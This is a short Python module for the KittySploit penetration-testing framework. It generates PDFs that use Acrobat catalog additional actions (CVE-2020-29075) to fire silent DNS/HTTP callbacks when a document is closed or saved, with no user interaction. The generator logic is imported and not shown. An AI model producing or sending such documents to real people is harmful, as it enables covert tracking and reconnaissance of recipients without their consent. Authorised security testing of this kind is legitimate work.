#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfPhonehomeMixin, format_test_ids
from lib.pdf.generators.silent import write_silent_dns_catalog_aa


class Module(Auxiliary, PdfPhonehomeMixin):
    __info__ = {
        "name": "PDF Silent DNS Callback Generator",
        "description": (
            "Generate PDFs with silent DNS/HTTP callbacks via Acrobat catalog "
            "additional actions (/AA /WC, /WS, /DS) that fire on document close "
            "or save without user interaction (CVE-2020-29075)."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-29075",
        ],
        "tags": ["pdf", "dns", "silent", "tracking", "acrobat", "callback"],
    }

    PDF_GENERATORS = (
        write_silent_dns_catalog_aa,
    )

    MODULE_TITLE = "PDF silent DNS callback generator"

    def run(self):
        print_info(f"    Test ids: {format_test_ids(self.PDF_GENERATORS)}")
        return self.run_pdf_phonehome()